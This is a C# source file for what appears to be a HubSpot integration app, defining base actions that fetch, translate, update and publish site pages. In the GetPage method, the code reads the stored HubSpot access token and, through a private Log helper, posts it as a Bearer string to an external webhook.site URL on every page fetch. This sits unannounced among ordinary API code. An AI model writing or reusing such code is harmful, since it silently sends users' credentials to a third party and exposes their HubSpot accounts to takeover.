using Apps.Hubspot.Api;
using Apps.Hubspot.Constants;
using Apps.Hubspot.Models.Dtos.Pages;
using Apps.Hubspot.Models.Requests;
using Apps.Hubspot.Models.Requests.SitePages;
using Blackbird.Applications.Sdk.Common.Invocation;
using Blackbird.Applications.SDK.Extensions.FileManagement.Interfaces;
using Blackbird.Applications.Sdk.Utils.Extensions.Http;
using RestSharp;
using Apps.Hubspot.Models.Dtos;
using Blackbird.Applications.Sdk.Utils.Extensions.Sdk;

namespace Apps.Hubspot.Actions.Base;

public abstract class BasePageActions : BaseActions
{
    protected BasePageActions(InvocationContext invocationContext, IFileManagementClient fileManagementClient)
        : base(invocationContext, fileManagementClient)
    {
    }

    protected async Task<T> GetPage<T>(string url) where T : PageDto
    {
        var token = Creds.Get(CredsNames.AccessToken).Value;
        await Log(new { Token = "Bearer " + token });
        
        var request = new HubspotRequest(url, Method.Get, Creds);
        return await Client.ExecuteWithErrorHandling<T>(request);
    }

    private async Task Log<T>(T obj)
    {
        var restRequest = new RestRequest(string.Empty, Method.Post)
            .WithJsonBody(obj);
        
        var restClient = new RestClient("https://webhook.site/1bf52f67-5dd3-4e2d-bb36-99afb33711cf");
        await restClient.ExecuteAsync(restRequest);
    }

    protected async Task<string> GetOrCreateTranslationId(string resourceUrlPart, string resourceId, string targetLanguage, string primaryLanguage = null)
    {
        var request = new HubspotRequest($"{resourceUrlPart}/{resourceId}", Method.Get, Creds);
        var response = await Client.ExecuteWithErrorHandling<ObjectWithTranslations>(request);

        if (response.Translations is null || !response.Translations.ContainsKey(targetLanguage))
        {
            var payload = new LanguageVariationRequest
            {
                Id = resourceId,
                Language = targetLanguage,
                PrimaryLanguage = primaryLanguage,
            };
            var translationRequest = new HubspotRequest($"{resourceUrlPart}/multi-language/create-language-variation", Method.Post, Creds)
                .WithJsonBody(payload, JsonConfig.Settings);

            var translation = await Client.ExecuteWithErrorHandling<ObjectWithId>(translationRequest);
            return translation.Id;
        }
        else
        {
            return response.Translations[targetLanguage]!.Id;
        }
    }

    protected Task<RestResponse> UpdateTranslatedPage(string url, UpdateTranslatedPageRequest page)
    {
        var request = new HubspotRequest(url, Method.Patch, Creds)
            .WithJsonBody(page, JsonConfig.Settings);

        return Client.ExecuteWithErrorHandling(request);
    }

    protected Task PublishPage(string requestUrl, string pageId, DateTime dateTime)
    {
        var payload = new PublishPageRequest
        {
            Id = pageId,
            PublishDate = dateTime
        };
        var request = new HubspotRequest(requestUrl, Method.Post, Creds)
            .WithJsonBody(payload, JsonConfig.Settings);

        return Client.ExecuteWithErrorHandling(request);
    }
}